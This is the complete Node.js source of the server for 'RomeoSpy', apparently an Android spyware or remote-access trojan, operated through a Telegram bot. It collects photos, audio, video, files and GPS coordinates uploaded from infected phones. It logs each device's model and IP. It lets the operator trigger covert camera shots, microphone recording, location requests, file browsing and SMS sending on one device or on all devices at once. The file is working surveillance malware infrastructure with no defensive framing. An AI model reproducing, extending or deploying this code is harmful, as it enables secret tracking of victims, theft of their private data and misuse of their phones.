const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const TelegramBot = require("node-telegram-bot-api");
const multer = require("multer");
const fs = require("fs");

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const upload = multer();

const config = JSON.parse(fs.readFileSync("./data.json", "utf8"));
const bot = new TelegramBot(config.token, { polling: true });

const sessions = new Map(); // chat.id => socketId
const pending = new Map();  // chat.id => { command, extras }
const browsing = new Map(); // chat.id => { socketId, path }

app.post("/upload", upload.single("file"), (req, res) => {
  const model = req.headers.model || "Unknown";
  const file = req.file;

  const latitude = parseFloat(req.headers.latitude);
  const longitude = parseFloat(req.headers.longitude);

  if (!isNaN(latitude) && !isNaN(longitude)) {
    bot.sendLocation(config.id, latitude, longitude, {
      reply_markup: { remove_keyboard: true }
    });
    bot.sendMessage(config.id, `📍 Location from ${model}:
Latitude: ${latitude}
Longitude: ${longitude}`);
    return res.send("Location sent");
  }

  if (file) {
    const fileOptions = {
      filename: file.originalname,
      contentType: file.mimetype
    };

    const caption = `📁 File from ${model}`;

    if (file.mimetype.startsWith("image/")) {
      bot.sendPhoto(config.id, file.buffer, {
        caption: `📷 Photo from ${model}`,
        parse_mode: "HTML"
      });
    } else if (file.mimetype.startsWith("audio/") || file.originalname.endsWith(".mp3")) {
      bot.sendAudio(config.id, file.buffer, {
        caption: `🎧 Audio from ${model}`,
        parse_mode: "HTML"
      });
    } else if (file.originalname.endsWith(".mp4")) {
      bot.sendVideo(config.id, file.buffer, {
        caption: `🎥 Video from ${model}`,
        parse_mode: "HTML"
      });
    } else {
      bot.sendDocument(config.id, file.buffer, {
        ...fileOptions,
        caption: caption,
        parse_mode: "HTML"
      });
    }
  }

  res.send("Done");
});

app.get("/text", (_, res) => res.send(config.text || "RomeoSpy"));

io.on("connection", socket => {
  const model = socket.handshake.headers.model || "Unknown";
  const version = socket.handshake.headers.version || "Unknown";
  const ip = socket.handshake.headers.ip || "Unknown";

  socket.meta = { model, version, ip };
  bot.sendMessage(config.id,
    `📡 New device connected\n\n📱 Model: ${model}\n📦 Version: ${version}\n🌐 IP: ${ip}`, { parse_mode: "HTML" }
  );

  socket.on("disconnect", () => {
    bot.sendMessage(config.id, `❌ Device disconnected: ${model}`, { parse_mode: "HTML" });
  });

  socket.on("message", msg => {
    bot.sendMessage(config.id, `💬 Message from ${model}:
${msg}`, { parse_mode: "HTML" });
  });

  socket.on("files", ({ path, folders }) => {
    const target = Array.from(sessions.entries()).find(([, id]) => id === socket.id);
    if (!target) return;
    const [chatId] = target;
    browsing.set(chatId, { socketId: socket.id, path });
    const buttons = folders.map(f => [{ text: f, callback_data: `cd:${f}` }]);
    if (path !== "/") buttons.unshift([{ text: "🔙 Back", callback_data: "cd:.." }]);
    bot.sendMessage(chatId, `📁 Folder: ${path}`, {
      reply_markup: { inline_keyboard: buttons }
    });
  });
});

bot.onText(/\/start/, msg => {
  bot.sendMessage(msg.chat.id, `👋 Welcome to RomeoSpy!\nSelect /devices to view connected phones.`, {
    reply_markup: {
      keyboard: [["/devices"]],
      resize_keyboard: true
    }
  });
});

bot.onText(/\/devices/, msg => {
  const list = Array.from(io.sockets.sockets.values());
  if (list.length === 0) return bot.sendMessage(msg.chat.id, "⚠️ No devices connected.");

  const buttons = list.map(s => [`${s.meta.model}`]);
  buttons.push(["All Devices"]);
  sessions.set(msg.chat.id, null); // Reset device selection

  bot.sendMessage(msg.chat.id, `📱 Choose a device:`, {
    reply_markup: {
      keyboard: buttons,
      resize_keyboard: true
    }
  });
});

bot.on("message", msg => {
  const chatId = msg.chat.id;
  const text = msg.text.trim();

  if (browsing.has(chatId)) return;

  // Handle pending text inputs
  if (pending.has(chatId)) {
    const { command, extras, socketId } = pending.get(chatId);
    const input = text;
    pending.delete(chatId);

    if (!socketId && command !== "sendSms") {
      io.emit("commend", { request: command, extras: [{ key: extras, value: input }] });
    } else if (command === "sendSms") {
      const state = extras.state;
      if (state === "number") {
        pending.set(chatId, { command, extras: { state: "text", number: input }, socketId });
        return bot.sendMessage(chatId, "📨 Enter the SMS message:");
      } else if (state === "text") {
        const payload = {
          request: "sendSms",
          extras: [
            { key: "number", value: extras.number },
            { key: "text", value: input }
          ]
        };
        sendCommand(chatId, socketId, payload);
        return;
      }
    } else {
      sendCommand(chatId, socketId, {
        request: command,
        extras: [{ key: extras, value: input }]
      });
    }
    return;
  }

  const found = Array.from(io.sockets.sockets.entries()).find(([, s]) => s.meta.model === text);
  if (found) {
    sessions.set(chatId, found[0]);
    return bot.sendMessage(chatId, `✅ Device selected: ${text}\nChoose a command:`, {
      reply_markup: {
        keyboard: [
          ["📸 Main Camera", "🤳 Selfie Camera"],
          ["🎤 Record Audio", "📍 Location"],
          ["🕹️ Toast", "🔊 Notification"],
          ["✉️ Send SMS"],
          ["📁 File Manager", "📳 Vibrate"],
          ["🔙 Back"]
        ],
        resize_keyboard: true
      }
    });
  }

  if (text === "All Devices") {
    sessions.set(chatId, null);
    return bot.sendMessage(chatId, `🌐 Sending to ALL devices.\nChoose a command:`, {
      reply_markup: {
        keyboard: [
          ["📸 Main Camera", "🤳 Selfie Camera"],
          ["🎤 Record Audio", "📍 Location"],
          ["🕹️ Toast", "🔊 Notification"],
          ["✉️ Send SMS"],
          ["📁 File Manager", "📳 Vibrate"],
          ["🔙 Back"]
        ],
        resize_keyboard: true
      }
    });
  }

  if (text === "🔙 Back") {
    sessions.delete(chatId);
    browsing.delete(chatId);
    return bot.sendMessage(chatId, `🏠 Main menu`, {
      reply_markup: {
        keyboard: [["/devices"]],
        resize_keyboard: true
      }
    });
  }

  const socketId = sessions.get(chatId);
  if (text === "📍 Location") return sendCommand(chatId, socketId, { request: "location", extras: [] });
  if (text === "📸 Main Camera") return sendCommand(chatId, socketId, { request: "main-camera", extras: [] });
  if (text === "🤳 Selfie Camera") return sendCommand(chatId, socketId, { request: "selfie-camera", extras: [] });

  if (text === "🎤 Record Audio") {
    pending.set(chatId, { command: "microphone", extras: "duration", socketId });
    return bot.sendMessage(chatId, "🎤 Enter duration in seconds:");
  }

  if (text === "🕹️ Toast") {
    pending.set(chatId, { command: "toast", extras: "text", socketId });
    return bot.sendMessage(chatId, "📝 Enter message to display as toast:");
  }

  if (text === "🔊 Notification") {
    pending.set(chatId, { command: "popNotification", extras: "text", socketId });
    return bot.sendMessage(chatId, "🔔 Enter text for notification:");
  }

  if (text === "✉️ Send SMS") {
    pending.set(chatId, { command: "sendSms", extras: { state: "number" }, socketId });
    return bot.sendMessage(chatId, "📞 Enter the phone number to send SMS:");
  }

  if (text === "📁 File Manager") {
    sendCommand(chatId, socketId, { request: "file-manager", extras: [] });
    return;
  }

  if (text === "📳 Vibrate") {
    sendCommand(chatId, socketId, { request: "vibrate", extras: [] });
    return;
  }
});

bot.on("callback_query", query => {
  const chatId = query.message.chat.id;
  const data = query.data;
  if (!browsing.has(chatId)) return;
  const { socketId, path } = browsing.get(chatId);
  const sock = io.sockets.sockets.get(socketId);
  if (!sock) return;
  sock.emit("commend", { request: "file-manager", extras: [{ key: "path", value: `${path}/${data.split(":")[1]}` }] });
  bot.answerCallbackQuery(query.id);
});

function sendCommand(chatId, socketId, payload) {
  if (!socketId) {
    io.emit("commend", payload);
    bot.sendMessage(chatId, `✅ Command sent to all devices.`);
  } else {
    const sock = io.sockets.sockets.get(socketId);
    if (sock) {
      sock.emit("commend", payload);
      bot.sendMessage(chatId, `✅ Command sent to ${sock.meta.model}`);
    } else {
      bot.sendMessage(chatId, `⚠️ Device not found.`);
    }
  }
}

// Start
server.listen(process.env.PORT || 3000, () => {
  console.log("🚀 RomeoSpy server running on port 3000");
});
